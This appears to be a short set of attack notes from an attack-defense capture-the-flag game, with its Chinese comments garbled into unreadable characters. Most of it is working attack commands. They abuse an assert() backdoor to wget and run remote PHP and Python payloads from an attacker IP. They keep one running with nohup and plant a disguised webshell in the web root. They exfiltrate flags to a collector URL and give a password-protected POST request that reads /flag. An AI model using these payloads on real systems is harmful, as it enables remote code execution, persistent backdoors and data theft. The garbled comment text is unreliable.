
ϵͳԭʼ�ĺ���assert($_POST[welcome])�������״�ִ��
welcome=system("wget -q http://172.20.120.5/php.txt -O /tmp/cache.php;php /tmp/cache.php|cat /flag;");      ��ǰ�޸ı���������ip��flag·����webĿ¼·��


wget -q http://172.20.120.5/php.txt -O /tmp/cache.php;php /tmp/cache.php;
wget -q http://172.20.120.5/py.txt -O /tmp/mylab.py;nohup python /tmp/mylab.py >/dev/null;

welcome=system("wget -q http://172.20.120.5/php.txt -O /tmp/cache.php;php /tmp/cache.php|cat /flag;wget -q http://172.20.120.5/user-inc.txt -O /var/www/html/test/--user.inc.php;");  

myserver��ŵ��ļ���80�˿ڸ�Ŀ¼����
php.txt  /tmp/cache.php   ��Ҫ�޸Ĺ�����IP��web·����flag·��
user-inc.txt  /var/www/html/--user-inc.php
py.txt  /tmp/systemd-private-a29c8d4b5e76422cb78179dd14906715-systemd-timesyncd.service-p9PBKc/session/mylab.py  #��Ҫ�޸Ĺ�����ip��flag·��
get.php?flag=$ip:$flag  #�޸Ĵ�ű��ؽ���flag�ļ���·��



�ֶ������Լ�д��ĺ���
http://$victimip/--user-inc.php
POST����:p=cswD$ha&sec=cHJpbnQoZmlsZV9nZXRfY29udGVudHMoIi9mbGFnIikpOw%3D%3D   
#base64('print(file_get_contents("/flag"));')


md5('cswD$ha')=='9bdae23f2f19c4c3d25e7719f7a72ee9'
